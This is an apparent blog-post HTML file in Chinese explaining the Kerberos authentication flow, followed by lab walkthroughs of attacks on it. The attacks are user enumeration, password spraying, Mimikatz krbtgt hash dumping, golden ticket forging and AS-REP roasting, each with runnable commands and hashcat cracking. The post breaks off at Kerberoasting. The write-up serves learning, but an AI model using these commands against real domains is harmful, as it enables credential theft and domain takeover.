@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Kerberos攻击方式【委派还没总结】" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Kerberos攻击方式【委派还没总结】
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="post-toc-text">0x00 前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFKerberos"><span class="post-toc-text">0x01 什么是Kerberos</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x02-Kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="post-toc-text">0x02 Kerberos认证过程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AS-REQ"><span class="post-toc-text">AS_REQ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AS-REP"><span class="post-toc-text">AS_REP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#TGS-REQ"><span class="post-toc-text">TGS_REQ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#TGS-REP"><span class="post-toc-text">TGS_REP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AP-REQ"><span class="post-toc-text">AP_REQ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AP-REP"><span class="post-toc-text">AP_REP</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x03-Kerberos%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="post-toc-text">0x03 Kerberos协议的安全问题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AS-REQ-1"><span class="post-toc-text">AS_REQ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Pass-The-Hash"><span class="post-toc-text">Pass The Hash</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="post-toc-text">域用户枚举</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Kerbrute"><span class="post-toc-text">Kerbrute</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#pyKerbrute"><span class="post-toc-text">pyKerbrute</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#MSF%E6%A8%A1%E5%9D%97"><span class="post-toc-text">MSF模块</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92-Password-Spraying"><span class="post-toc-text">密码喷洒(Password Spraying)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Kerbrute-1"><span class="post-toc-text">Kerbrute</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#pyKerbrute-1"><span class="post-toc-text">pyKerbrute</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#DomainPasswordSpray-ps1"><span class="post-toc-text">DomainPasswordSpray.ps1</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AS-REP-1"><span class="post-toc-text">AS_REP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="post-toc-text">黄金票据攻击</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#AS-REP-Roasting%E6%94%BB%E5%87%BB"><span class="post-toc-text">AS_REP Roasting攻击</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Rubeus"><span class="post-toc-text">Rubeus</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ASREPRoast-ps1"><span class="post-toc-text">ASREPRoast.ps1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Adfind%E5%92%8Cimpacket"><span class="post-toc-text">Adfind和impacket</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#TGS-REP-1"><span class="post-toc-text">TGS_REP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Kerberoasting"><span class="post-toc-text">Kerberoasting</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#SPN%E7%9A%84%E5%8F%91%E7%8E%B0"><span class="post-toc-text">SPN的发现</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E7%A5%A8%E6%8D%AE%EF%BC%88ST%EF%BC%89"><span class="post-toc-text">请求服务票据（ST）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%A5%A8%E6%8D%AE"><span class="post-toc-text">导出内存中的服务票据</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E7%A6%BB%E7%BA%BF%E7%88%86%E7%A0%B4%E7%A5%A8%E6%8D%AE"><span class="post-toc-text">离线爆破票据</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="post-toc-text">白银票据攻击</span></a></li></ol></li></ol></li></ol>
+            
+        
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这一篇文章是我对自己学习kerberos过程中的一点总结，有些错误还请指出</p>
+<h2 id="0x01-什么是Kerberos"><a href="#0x01-什么是Kerberos" class="headerlink" title="0x01 什么是Kerberos"></a>0x01 什么是Kerberos</h2><p>Kerberos 是一种网络身份验证协议。它旨在通过使用密钥加密为客户端&#x2F;服务器应用程序提供强大的身份验证。</p>
+<p>他是一个无密码基于ticket的认证方式。</p>
+<p>整个kerberos分为三个部分：</p>
+<ul>
+<li>访问服务的客户端(Client)</li>
+<li>提供服务的服务端(Service)</li>
+<li>提供认证服务的密钥分发中心，Key Distribution Center(KDC)</li>
+</ul>
+<p>KDC由三个部分组成</p>
+<ul>
+<li>认证服务器，Authentication Server(AS):进行用户信息认证，为客户端提供 Ticket Granting Tickets(TGT)。</li>
+<li>票据授权服务器，Ticker Granting Server(TGS):验证 TGT 与 Authenticator，为客户端提供 Service Tickets。</li>
+<li>Kerberos数据库，Kerberos Database:包含了一个域中所有的用户信息。</li>
+</ul>
+<h1 id="0x02-Kerberos认证过程"><a href="#0x02-Kerberos认证过程" class="headerlink" title="0x02 Kerberos认证过程"></a>0x02 Kerberos认证过程</h1><p>简易的认证过程如下</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302152252966.png" alt="kerberos流程图"></p>
+<h2 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><p>Client发送的请求包内容包括：</p>
+<ul>
+<li>请求的用户名cname</li>
+<li>域名realm</li>
+<li>Authenticator（用户密钥加密的时间戳）</li>
+<li>请求的服务名sname</li>
+<li>加密类型etype</li>
+<li>其他信息，版本号、消息类型，票据有效时间、是否包含pac。协商选项等</li>
+</ul>
+<p>Authenticator是预身份验证的部分</p>
+<h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h2><p>如果开启了预身份验证，那么AS就会从活动目录数据库中取出该用户的密钥，然后用该密钥对请求包中预身份验证部分(Authenticator)进行解密，如果解密成功，并且解密出来的时间戳在一定范围内，则证明请求者提供的用户密钥正确。【如果没有开启身份验证，就不会有这段过程，这也是AS_REP Roasting攻击的前提】</p>
+<p>在AS成功认证之后，就会给客户端发送AS_REP包，AS_REP数据包的主要内容包括:</p>
+<ul>
+<li>版本号、域名、用户名等</li>
+<li><strong>TGT</strong>(Ticket Granting ticket)</li>
+<li>Logon Session Key</li>
+</ul>
+<p><em><strong>TGT</strong></em>是用krbtgt的密码哈希进行加密的，Logon Session Key是由用户的密码哈希进行加密的【krbtgt是KDC的服务账户】，TGT代表了是哪个用户在进行请求服务的操作</p>
+<p>其中 TGT里包含</p>
+<ul>
+<li>PAC（Privilege Attribute certificate），PAC包含各种授权信息、附加凭据信息、配置文件和策略信息等，例如用户所属的用户组、用户所具有的权限等。</li>
+<li>Logon Session Key</li>
+<li>用户名、域名、认证时间、认证到期时间</li>
+</ul>
+<p>总的来说，在经过这个过程后，AS会给Client返回一个包含PAC信息的TGT，TGT用来向TGS申请相关服务的ST（Server ticket)</p>
+<h2 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h2><p>客户端在收到AS_REP后会在本地缓存TGT和Logon Session Key，然后用TGT向TGS购买相应服务的ST</p>
+<p>TGS_REQ数据包的主要内容包括</p>
+<ul>
+<li>域名realm</li>
+<li>请求的服务名sname</li>
+<li>TGT</li>
+<li>Authenticator(用Logon Session Key加密的时间戳)，用于保证会话的安全性</li>
+<li>加密类型</li>
+<li>其他信息，如版本号、消息类型、协商选项、到期时间等</li>
+</ul>
+<h2 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><p>在TGS收到TGS_REQ之后，会进行如下操作</p>
+<p>首先，使用krbtgt密码哈希值对TGT的加密部分进行解密。得到Logon Session Key和PAC等信息，解密成功则说明是KDC颁发的</p>
+<p>然后，验证PAC的签名，签名正确则证明PAC未经过篡改【PAC有两个数字签名：PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM；PAC_SERVER_CHECKSUM使用服务密钥进行签名，PAC_PRIVSVR_CHECKSUM使用KDC密钥进行签名】</p>
+<p>最后，使用得到的Logon Session Key解密Authenticator得到时间戳等信息，如果解密成功且时间在有效范围内，则验证了会话的安全性</p>
+<p>进行如上验证之后，TGS_REP就会返回包含如下内容的数据包:</p>
+<ul>
+<li>版本号、域名、用户名等</li>
+<li>ST</li>
+<li>Service Session Key</li>
+</ul>
+<p>ST的明文部分包含版本号、域名、请求的服务名</p>
+<p>ST的加密部分（使用服务密钥加密）包括:</p>
+<ul>
+<li>Service Session Key</li>
+<li>PAC</li>
+<li>用户名、域名、认证时间、认证信息等</li>
+</ul>
+<p>ST里和ST外的Service Session Key都是用Logon Session Key进行加密的，用于下一阶段的认证密钥</p>
+<h2 id="AP-REQ"><a href="#AP-REQ" class="headerlink" title="AP_REQ"></a>AP_REQ</h2><p>在客户端收到TGS_REP后，从中抽取ST和Service Session Key并准备开始申请访问服务</p>
+<p>AP_REQ数据包中包含的内容:</p>
+<ul>
+<li>ST</li>
+<li>Authenticator(用Service Session Key加密的时间戳)</li>
+<li>其他信息，如版本号、消息类型、协商选项等</li>
+</ul>
+<h2 id="AP-REP"><a href="#AP-REP" class="headerlink" title="AP_REP"></a>AP_REP</h2><p>这一步是可选的，当客户端希望验证提供服务的服务端时（即AP_REQ请求的mutual-required选项为True），服务端就返回AP_REP消息。</p>
+<p>服务端收到客户端发来的AP_REQ之后，通过服务密钥解密ST得到Service Session Key和PAC等信息，然后用Service Session Key解密Authenticator得到时间戳。如果解密成功且时间戳在有效范围内，则验证了客户端的身份。</p>
+<p>验证了客户端身份后，服务端从ST中取出PAC中代表用户身份权限信息（主要通过User RID和Group RID）的数据，然后与请求的服务ACL做对比，生成相应的访问令牌。</p>
+<p>同时，服务端会检测AP_REQ请求的mutual-required选项是否为True，如果是，则说明客户端想验证提供服务的服务端的身份。此时，服务端会用Service Session Key加密的时间戳作为Authenticator，在AP_REP包中发送给客户端进行验证。如果为False，服务端会根据访问令牌的权限决定是否返回相应的服务给客户端</p>
+<h1 id="0x03-Kerberos协议的安全问题"><a href="#0x03-Kerberos协议的安全问题" class="headerlink" title="0x03 Kerberos协议的安全问题"></a>0x03 Kerberos协议的安全问题</h1><p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302222004154.png" alt="未命名-2"></p>
+<h2 id="AS-REQ-1"><a href="#AS-REQ-1" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>因为在AS_REQ过程中是使用用户的密码对时间戳进行加密的，所以如果获取了一个用户的密码hash，那么就可以伪造成这个用户来对服务进行访问</p>
+<p>但是攻击手法我在网上没有搜到</p>
+<h3 id="域用户枚举"><a href="#域用户枚举" class="headerlink" title="域用户枚举"></a>域用户枚举</h3><p>在AS_REQ包中的cname字段的值代表用户名，这个值存在与否，返回的包是不一样的。所以可以用来枚举域用户名</p>
+<p>枚举工具:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a></li>
+<li>MSF模块</li>
+</ul>
+<p>下面在Try hack me的环境下进行实践(自己搭环境太麻烦了 XD)</p>
+<h4 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h4><p>要先将域名和ip添加到&#x2F;etc&#x2F;host里，进行域名解析</p>
+<p>字典是关键</p>
+<pre><code class="bash">┌──(kali㉿kali)-[~/Desktop/tools/for kerberos/kerbrute]
+└─$ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local ./dict/users.txt
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161540200.png" alt="image-20230216154037154"></p>
+<h4 id="pyKerbrute"><a href="#pyKerbrute" class="headerlink" title="pyKerbrute"></a>pyKerbrute</h4><p>使用python通过Kerberos Pre-Authentication快速暴力破解并枚举有效的Active Directory账户</p>
+<p>有TCP和UDP两种模式</p>
+<pre><code class="bash">EnumADUser.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;mode&gt;
+&lt;mode&gt;: tcp or udp
+</code></pre>
+<pre><code class="bash">python2 EnumADUser.py  10.10.65.205  CONTROLLER.local dict/users.txt  tcp
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161549043.png" alt="image-20230216154950000"></p>
+<h4 id="MSF模块"><a href="#MSF模块" class="headerlink" title="MSF模块"></a>MSF模块</h4><p><code>auxiliary/gather/kerberos_enumusers</code>模块</p>
+<p>设置相应的参数</p>
+<pre><code class="bash">msf6 auxiliary(gather/kerberos_enumusers) &gt; set DOMAIN CONTROLLER.local
+DOMAIN =&gt; CONTROLLER.local
+msf6 auxiliary(gather/kerberos_enumusers) &gt; set RHOSTS 10.10.65.205
+RHOSTS =&gt; 10.10.65.205
+msf6 auxiliary(gather/kerberos_enumusers) &gt; set USER_FILE /tmp/users.txt
+USER_FILE =&gt; /tmp/users.txt
+msf6 auxiliary(gather/kerberos_enumusers) &gt; run
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161553073.png" alt="image-20230216155352995"></p>
+<p>还会检测是否开启预身份验证而且还给了hash，良心！！！</p>
+<h3 id="密码喷洒-Password-Spraying"><a href="#密码喷洒-Password-Spraying" class="headerlink" title="密码喷洒(Password Spraying)"></a>密码喷洒(Password Spraying)</h3><p>在AS_REQ过程中，如果用户名存在，密码正确与否，返回的包也是不一样的，所以可以使用单一的密码，对用户字典里的用户进行爆破，就是密码喷洒</p>
+<p>工具:</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1">DomainPasswordSpray.ps1</a></p>
+</li>
+</ul>
+<h4 id="Kerbrute-1"><a href="#Kerbrute-1" class="headerlink" title="Kerbrute"></a>Kerbrute</h4><p>使用以下命令，对指定的域用用户字典进行爆破，找出密码为P@ss1234的</p>
+<pre><code class="bash">./kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local ./dict/users.txt P@ss1234
+</code></pre>
+<p>使用以下命令，爆破用户的密码</p>
+<pre><code class="bash">./kerbrute bruteuser --dc CONTROLLER.local -d CONTROLLER.local ./dict/password.txt  administrator
+</code></pre>
+<h4 id="pyKerbrute-1"><a href="#pyKerbrute-1" class="headerlink" title="pyKerbrute"></a>pyKerbrute</h4><p>在tcp模式下可以对明文密码和Hash密码进行喷洒攻击</p>
+<pre><code class="bash">ADPwdSpray.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;file&gt; &lt;passwordtype&gt; &lt;data&gt; &lt;mode&gt;
+&lt;mode&gt;: tcp or udp
+&lt;passwordtype&gt;: clearpassword oe ntlmhash
+</code></pre>
+<pre><code class="bash">python2  10.10.65.205  CONTROLLER.local dict/users.txt clearpassword P@ss1234 tcp
+</code></pre>
+<h4 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h4><p>要在域内的机器执行,原理是利用LDAP从域中导出用户列表，去除被锁定的用户，再用指定密码进行喷洒</p>
+<pre><code class="cmd">Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password P@ass1234
+</code></pre>
+<h2 id="AS-REP-1"><a href="#AS-REP-1" class="headerlink" title="AS_REP"></a>AS_REP</h2><h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>所谓黄金票据，就是利用krbtgt的密码哈希值来伪造一个TGT，可以用来伪造任意用户的TGT，甚至这个用户不存在！</p>
+<p>生成黄金票据的条件如下</p>
+<ul>
+<li>域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot] </li>
+<li>域的SID值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value] </li>
+<li>域的KRBTGT账户NTLM密码哈希</li>
+<li>要伪造的用户名</li>
+</ul>
+<p>可以是Mimikatz来转储krbtgt的密码哈希值，需要在域控上使用</p>
+<pre><code class="cmd">mimikatz.exe &quot;Log&quot; &quot;Privilege::Debug&quot; &quot;lsadump::lsa /patch&quot; &quot;exit&quot;
+</code></pre>
+<p>然后就可以获得krbtgt的NTLM-Hash和domain SID</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161702729.png" alt="image-20230216170214694"></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161700639.png" alt="image-20230216170011603"></p>
+<p>也可以使用</p>
+<pre><code class="cmd">mimikatz.exe &quot;Log&quot; &quot;Privilege::Debug&quot; &quot;lsadump::lsa /inject /name:krbtgt&quot; &quot;exit&quot;
+</code></pre>
+<p>来转储指定用户的哈希值</p>
+<p>然后在Mimikatz执行以下命令来创建黄金票据</p>
+<pre><code class="cmd">Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /ticket:ticket.kirbi [/id:对应用户的rid]
+</code></pre>
+<p>在创建完票据后，进行票据传递，从而获得伪造用户的权限</p>
+<pre><code class="cmd">Kerberos::ptt ticket.kirbi
+</code></pre>
+<p>票据传递之后，就是在建立IPC连接后的攻击方式了，而IPC能够访问的机器取决于伪造用户的权限高低</p>
+<p><strong>psexec</strong></p>
+<pre><code>PsExec.exe \\192.168.60.1 cmd.exe
+</code></pre>
+<p><strong>WMIEXEC.VBS</strong></p>
+<pre><code>cscript wmiexec.vbs /shell 192.168.60.1
+</code></pre>
+<h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS_REP Roasting攻击"></a>AS_REP Roasting攻击</h3><p>AS_REP Roasting是一种对用户账户进行离线爆破的方式</p>
+<p>需要关闭预身份验证，而此选项又是默认开启的，所以有一定的限制</p>
+<p>默认开启的预身份验证是会记录密码错误次数来防止爆破的</p>
+<p>关闭预身份验证后，在进行AS_REQ之后的时候，KDC不会进行任何验证就将TGT和用该用户Hash加密的Login Session Key返回</p>
+<p>由于AS_REP的数据包中Login Session Key的是由用户Hash进行加密的</p>
+<p>因此，可以对获取到的用户Hash加密的Login Session Key进行离线爆破，得到对应用户的明文密码</p>
+<p>【爆破的原理就是将明文进行hash计算，然后再对Login Session Key进行解密，如果成功，则得到明文密码】</p>
+<p>AS_REP Roasting攻击的前提条件:</p>
+<ul>
+<li>域用户需要勾选“不要求Kerberos预身份验证”选项</li>
+<li>需要一台可与KDC 88端口进行通信的主机</li>
+</ul>
+<p>工具:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rebeus</a>【需要在域内主机使用】</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/MorielHarush/Red-Team-Tools/blob/main/ASREPRoast.ps1">ASREPRoast.ps1</a>【需要在域内主机使用】</li>
+<li><a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/adfind/index.htm">Adfind</a>和<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">impacket</a>【可以在非域内主机使用】</li>
+</ul>
+<h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>执行以下命令，Rebeus会自动搜素域内关闭了预身份验证的用户，并以该用户身份发起AS_REQ，并获得AS_REP，将用户Hash加密的Login Session Key转储为hashcat可以进行爆破的格式，保存为hash.txt</p>
+<pre><code class="cmd">Rubeus.exe asreproast /format:hashcat /outfile:hash.txt
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172028437.png" alt="image-20230217202717813"></p>
+<p>然后使用hashcat进行爆破</p>
+<pre><code class="bash">hashcat  -a 0 -m 18200 1.txt  rockyou.txt  -o 2.txt 
+#1.txt；目标hash
+#rockyou.txt；字段
+</code></pre>
+<p>如果字典够牛逼，就可以获得那些关闭了预身份验证的用户的密码</p>
+<h4 id="ASREPRoast-ps1"><a href="#ASREPRoast-ps1" class="headerlink" title="ASREPRoast.ps1"></a>ASREPRoast.ps1</h4><p>原理跟Rebeus一样，要先导入ASREPRoast.ps1再执行</p>
+<p>会返回关闭了预身份验证的用户名、DN以及用户Hash加密的Login Session Key</p>
+<p>最后使用select过滤出Hash</p>
+<pre><code class="cmd">Import-Module .\ASREPRoast.ps1
+Invoke-ASREPRoasting | select -ExpandProperty Hash
+</code></pre>
+<h4 id="Adfind和impacket"><a href="#Adfind和impacket" class="headerlink" title="Adfind和impacket"></a>Adfind和impacket</h4><p><a target="_blank" rel="noopener" href="https://www.joeware.net/freetools/tools/adfind/usage.htm">Adfind使用帮助</a></p>
+<p>对于非域内的主机，可以使用Adfind执行以下命令过滤出关闭了预身份验证的用户</p>
+<p>需要拥有一个有效的域账户和密码</p>
+<pre><code class="cmd">AdFind.exe -h 10.10.17.251 -u Administrator -up P@$$W0rd -dn -f &quot;useraccountcontrol:1.2.840.113556.1.4.803:=4194304&quot;
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172120594.png" alt="image-20230217212009518"></p>
+<p>然后使用impacket的GetBPUser.py把上面过滤出的域账户写入user.txt文件，运行如下命令获取指定用户hash加密的Login Session Key，并以hashcat可以爆破的格式打印出来</p>
+<pre><code class="cmd">python GetNPUsers.py  -dc-ip 10.10.17.251 -usersfile GetNPUser.txt  -format hashcat controller.local/
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172127309.png" alt="image-20230217212727241"></p>
+<p>然后用hashcat进行爆破就行</p>
+<h2 id="TGS-REP-1"><a href="#TGS-REP-1" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>Kerberoasting攻击发生在Kerberos的TGS_REP阶段，KDC的TGS返回一个由服务Hash加密的ST给客户端。</p>
